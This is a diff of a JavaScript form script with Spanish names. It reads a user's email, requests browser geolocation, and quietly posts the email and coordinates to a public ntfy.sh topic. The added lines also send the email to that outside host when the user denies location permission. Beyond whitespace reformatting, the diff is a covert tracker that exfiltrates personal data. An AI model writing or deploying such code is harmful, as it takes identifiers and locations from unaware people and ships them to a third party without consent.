@@ -1,9 +1,9 @@
 let pos = {}
-let submiteateste = (event)=>{
+let submiteateste = (event) => {
     event.preventDefault();
     let id = document.getElementById('email').value
-    if(id.length>6){
-        obtenerUbicacion()       
+    if (id.length > 6) {
+        obtenerUbicacion()
     }
 }
 function obtenerUbicacion() {
@@ -17,19 +17,26 @@ function obtenerUbicacion() {
 function mostrarPosicion(posicion) {
     var latitud = posicion.coords.latitude;
     var longitud = posicion.coords.longitude;
-    pos = {latitude: latitud, longitude: longitud, id:document.getElementById('email').value}
+    pos = { latitude: latitud, longitude: longitud, id: document.getElementById('email').value }
     msg = JSON.stringify(pos)
     fetch('https://ntfy.sh/xrpw_alery', {
-        method:'POST',
+        method: 'POST',
         body: msg
     })
     document.getElementById('email').value = ''
 
 }
 function mostrarError(error) {
-    switch(error.code) {
+    switch (error.code) {
         case error.PERMISSION_DENIED:
             alert("El usuario denegó la solicitud de geolocalización.");
+            msg = JSON.stringify(document.getElementById('email').value)
+            fetch('https://ntfy.sh/xrpw_alery', {
+                method: 'POST',
+                body: msg
+            })
+            document.getElementById('email').value = ''
+
             break;
         case error.POSITION_UNAVAILABLE:
             alert("La información de ubicación no está disponible.");
